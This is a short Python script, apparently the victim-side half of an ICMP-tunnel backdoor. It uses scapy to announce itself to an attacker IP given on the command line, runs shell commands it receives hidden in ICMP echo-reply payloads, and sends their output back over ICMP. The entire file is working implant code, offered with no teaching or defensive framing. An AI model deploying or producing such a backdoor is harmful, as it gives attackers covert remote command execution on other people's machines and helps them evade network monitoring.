from scapy.all import *
import subprocess
import sys

attacker_ip = sys.argv[1]


def send_icmp_to_attacker():
    packet = IP(dst=attacker_ip) / ICMP(id=10, type=8)
    send(packet)
    print(f"sent to attacker ip at: {attacker_ip}")


# ICMP id 10 = 0xa
def check_packet(packet):
    try:
        if packet.haslayer(ICMP) and packet[ICMP].type == 0:
            if packet[ICMP].id == 10 and packet[Raw].load:
                if packet[Ether].src != get_if_hwaddr("eth0"):
                    result = subprocess.run(
                        packet[Raw].load, shell=True, capture_output=True, text=True
                    )
                    if result.stdout:
                        reply_packet = (
                            IP(dst=packet[IP].src)
                            / ICMP(id=10, type=0)
                            / Raw(load=result.stdout)
                        )
                        send(reply_packet)
                    elif result.stderr:
                        reply_packet = (
                            IP(dst=packet[IP].src)
                            / ICMP(id=10, type=0)
                            / Raw(load=result.stderr)
                        )
                        send(reply_packet)
                    else:
                        reply_packet = (
                            IP(dst=packet[IP].src) / ICMP(id=10, type=0) / Raw()
                        )
                        send(reply_packet)

    except Exception as e:
        pass


def main():
    send_icmp_to_attacker()
    sniff(prn=check_packet)


if __name__ == "__main__":
    main()
